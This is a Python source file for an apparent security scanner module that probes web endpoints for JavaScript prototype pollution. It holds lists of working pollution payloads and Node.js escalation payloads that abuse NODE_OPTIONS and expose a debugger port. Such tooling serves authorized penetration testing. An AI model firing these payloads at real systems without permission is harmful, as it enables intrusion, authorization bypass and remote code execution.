"""
Aura v29.0 — Prototype Pollution Engine ☣️
===========================================
Detects JavaScript Prototype Pollution vulnerabilities.
Targets both Server-Side (Node.js/Express) and provides
indicators for Client-Side pollution.

Attack vectors:
  - GET parameter pollution: ?__proto__[polluted]=aura29
  - POST JSON body: {"__proto__": {"polluted": "aura29"}}
  - Constructor path: {"constructor": {"prototype": {"polluted": "aura29"}}}
  - Nested merge: {"a": {"__proto__": {"polluted": "aura29"}}}

Impact:
  - Server-Side: RCE in Node.js (child_process spawn, shell options)
  - Denial of Service (breaking app logic)
  - Property injection (bypassing authorization checks)
  - Client-Side: XSS, CSP bypass
"""
import asyncio
import json
import re
import httpx
from rich.console import Console

from aura.ui.formatter import console

CANARY = "AURA_PP_29"

# Server-side pollution payloads
SS_PAYLOADS = [
    # Query string format
    {"method": "GET", "format": "qs",
     "data": f"__proto__[aura_polluted]={CANARY}&constructor[prototype][aura_polluted]={CANARY}"},

    # JSON body — __proto__
    {"method": "POST", "format": "json",
     "data": {"__proto__": {"aura_polluted": CANARY}}},

    # JSON body — constructor.prototype
    {"method": "POST", "format": "json",
     "data": {"constructor": {"prototype": {"aura_polluted": CANARY}}}},

    # Nested merge path
    {"method": "POST", "format": "json",
     "data": {"a": {"__proto__": {"aura_polluted": CANARY}}}},

    # Array merge path
    {"method": "POST", "format": "json",
     "data": [{"__proto__": {"aura_polluted": CANARY}}]},
]

# RCE escalation payloads (non-destructive: only reads env vars)
RCE_PAYLOADS_NODE = [
    {"__proto__": {"env": {"AURA_RCE": "1"}, "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}},
    {"__proto__": {"shell": "node", "NODE_OPTIONS": f"--inspect=0.0.0.0:9222"}},
]


class PrototypePollutionEngine:
    """
    v29.0: Prototype Pollution Scanner.
    """

    def __init__(self, session=None):
        self.session = session

    def _check_pollution(self, response: httpx.Response) -> bool:
        """Checks if the canary appears in the response (pollution leaked into response)."""
        return CANARY in response.text

    async def _test_payload(self, client: httpx.AsyncClient, url: str,
                            payload_spec: dict) -> dict | None:
        """Tests a single prototype pollution payload."""
        method = payload_spec["method"]
        fmt = payload_spec["format"]
        data = payload_spec["data"]

        try:
            if method == "GET" and fmt == "qs":
                r = await client.get(f"{url}?{data}", timeout=10, follow_redirects=True)
            elif method == "POST" and fmt == "json":
                r = await client.post(
                    url,
                    content=json.dumps(data),
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    follow_redirects=True
                )
            else:
                return None
        except Exception:
            return None

        if self._check_pollution(r):
            return {
                "url": url,
                "method": method,
                "payload": data if fmt == "json" else data,
                "response_snippet": r.text[:400],
                "status": r.status_code,
            }
        return None

    async def scan_url(self, url: str) -> list:
        """Scans a URL for prototype pollution."""
        findings = []
        console.print(f"[bold cyan][☣️ PP] Testing prototype pollution on {url}...[/bold cyan]")

        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            sem = asyncio.Semaphore(5)

            async def _test(spec):
                async with sem:
                    return await self._test_payload(client, url, spec)

            results = await asyncio.gather(*[_test(p) for p in SS_PAYLOADS])

        for hit in results:
            if hit is None:
                continue

            evidence = (
                f"Prototype Pollution CONFIRMED\n"
                f"URL: {hit['url']}\n"
                f"Method: {hit['method']}\n"
                f"Payload: {json.dumps(hit['payload'], indent=2) if isinstance(hit['payload'], dict) else hit['payload']}\n"
                f"Canary `{CANARY}` reflected in response.\n"
                f"Response Snippet: {hit['response_snippet']}\n\n"
                f"Impact: Server-side prototype pollution may allow property injection, "
                f"authorization bypass, DoS, or RCE in Node.js environments via shell options."
            )

            console.print(f"[bold red][☣️ PP CONFIRMED] Prototype Pollution on {hit['url']} via {hit['method']}[/bold red]")

            findings.append({
                "type": "Prototype Pollution",
                "finding_type": "JavaScript Prototype Pollution",
                "severity": "HIGH",
                "owasp": "A03:2021 – Injection",
                "mitre": "T1059.007 – JavaScript",
                "content": evidence,
                "url": url,
                "confirmed": True,
                "poc_evidence": evidence,
            })
            break  # one confirmed per URL

        if not findings:
            console.print(f"[dim][PP] No prototype pollution detected on {url}[/dim]")
        return findings

    async def scan_urls(self, urls: list) -> list:
        """Scans multiple API endpoints for prototype pollution."""
        # Prioritize JSON API endpoints
        api_candidates = [
            u for u in urls
            if any(k in u.lower() for k in ["api", "json", "rest", "graphql", "v1", "v2", "data"])
        ]
        targets = api_candidates or urls[:20]
        console.print(f"[bold cyan][☣️ PP Engine] Testing {len(targets)} API endpoint(s) for prototype pollution...[/bold cyan]")

        all_findings = []
        sem = asyncio.Semaphore(5)

        async def _scan(url):
            async with sem:
                return await self.scan_url(url)

        results = await asyncio.gather(*[_scan(u) for u in targets])
        for r in results:
            all_findings.extend(r)

        if all_findings:
            console.print(f"[bold red][☣️ PP] {len(all_findings)} Prototype Pollution finding(s) confirmed![/bold red]")
        return all_findings
